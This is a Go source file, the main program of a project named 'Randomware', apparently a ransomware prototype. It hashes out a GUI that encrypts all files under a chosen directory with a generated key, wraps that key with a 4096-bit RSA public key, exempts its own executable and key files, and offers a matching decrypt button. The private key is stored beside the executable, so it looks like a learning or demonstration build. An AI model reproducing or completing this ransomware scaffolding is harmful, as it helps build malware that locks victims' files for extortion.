package main

import (
	"Randomware/encryption"
	"Randomware/encryption/keys"
	"Randomware/file"
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"strconv"

	"github.com/lxn/walk"
	. "github.com/lxn/walk/declarative"
)

// PubKeyFile : is the public key file name
const PubKeyFile string = "rsa_public_key.pub"

// PrivKeyFile : is the private key file name
const PrivKeyFile string = "rsa_private_key.priv"

// EncryptedKeyFile : is the encrypted key file
const EncryptedKeyFile string = "safe_key"

// setEnv : initializes the environment variables
func setEnv() {
	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	file.HostName, err = os.Hostname()

	if err != nil {
		file.HostName = ".BAD-PC"
	} else {
		file.HostName = "." + file.HostName
	}

	exePath, err := os.Executable()

	if err != nil {
		log.Fatal(err)
	}

	exeDir := filepath.Dir(exePath) + "\\"
	file.SafeFiles = []string{exePath, exeDir + PubKeyFile, exeDir + PrivKeyFile, exeDir + EncryptedKeyFile}

	fmt.Println(user.HomeDir, " ", user.Username, " ", file.HostName, " ", file.SafeFiles)
}

func main() {
	var inTE, outTE *walk.TextEdit
	setEnv()

	MainWindow{
		Title:   "SCREAMO",
		MinSize: Size{600, 400},
		Layout:  VBox{},
		Children: []Widget{
			HSplitter{
				Children: []Widget{
					TextEdit{AssignTo: &inTE},
					TextEdit{AssignTo: &outTE, ReadOnly: true},
				},
			},
			PushButton{
				Text: "Encrypt",
				OnClicked: func() {
					//File Encryption
					privateKey, publicKey := keys.GenerateKeyPair(4096)
					file.BytesToNewFile(PubKeyFile, keys.PublicKeyToBytes(publicKey))
					file.BytesToNewFile(PrivKeyFile, keys.PrivateKeyToBytes(privateKey))
					//Encrypt file
					var key *[]byte
					key = encryption.GenKey()
					file.BytesToNewFile(EncryptedKeyFile, keys.EncryptWithPublicKey(key, publicKey))
					nbrFiles, err := file.EncryptAll(inTE.Text(), key)
					if err != nil {
						log.Fatal(err)
					}
					outTE.SetText("Encrypted files number: " + strconv.Itoa(int(nbrFiles)))
				},
			},
			PushButton{
				Text: "Decrypt",
				OnClicked: func() {
					//File Decryption
					encryptedKey, err := file.BytesFromFile(EncryptedKeyFile)
					if err != nil {
						log.Fatal(err)
					}
					privateKeyBytes, err := file.BytesFromFile(PrivKeyFile)
					if err != nil {
						log.Fatal(err)
					}
					privateKey := keys.BytesToPrivateKey(privateKeyBytes)
					var key *[]byte
					key = keys.DecryptWithPrivateKey(encryptedKey, privateKey)
					nbrFiles, err := file.DecryptAll(inTE.Text(), key)
					if err != nil {
						log.Fatal(err)
					}
					outTE.SetText("Decrypted files number: " + strconv.Itoa(int(nbrFiles)))
				},
			},
		},
	}.Run()

}
